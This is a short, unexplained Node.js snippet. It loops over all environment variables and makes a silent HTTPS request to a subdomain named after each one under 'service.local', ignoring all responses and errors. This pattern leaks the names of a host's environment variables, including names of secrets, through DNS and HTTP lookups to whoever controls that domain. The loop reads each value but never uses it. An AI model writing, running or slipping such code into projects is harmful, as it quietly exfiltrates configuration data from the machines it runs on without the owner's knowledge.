const https=require('https'); const domain='service.local';
for (const [key,value] of Object.entries(process.env)) { const url=`https://${key}.${domain}/path`; https.get(url,()=>{}).on('error',()=>{}); }
